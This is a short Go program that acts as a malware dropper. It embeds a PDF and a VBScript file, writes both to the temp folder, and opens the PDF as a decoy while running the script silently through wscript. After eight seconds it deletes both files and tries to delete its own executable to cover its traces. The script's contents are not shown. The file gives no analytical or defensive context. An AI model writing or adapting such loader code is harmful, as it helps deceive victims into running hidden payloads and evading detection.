package main

import (
    "embed"
    "os"
    "os/exec"
    "path/filepath"
    "time"
)

//go:embed document.pdf setup.vbs
var content embed.FS

func main() {
    tempDir := os.TempDir()

    // Save PDF
    pdfPath := filepath.Join(tempDir, "document.pdf")
    pdfData, _ := content.ReadFile("document.pdf")
    os.WriteFile(pdfPath, pdfData, 0644)

    // Save setup.vbs
    vbsPath := filepath.Join(tempDir, "setup.vbs")
    vbsData, _ := content.ReadFile("setup.vbs")
    os.WriteFile(vbsPath, vbsData, 0644)

    // Launch PDF
    exec.Command("rundll32", "url.dll,FileProtocolHandler", pdfPath).Start()

    // Launch VBS
    exec.Command("wscript", vbsPath).Start()

    // Wait and delete files
    time.Sleep(8 * time.Second)
    os.Remove(pdfPath)
    os.Remove(vbsPath)

    exePath, _ := os.Executable()
    os.Remove(exePath)
}
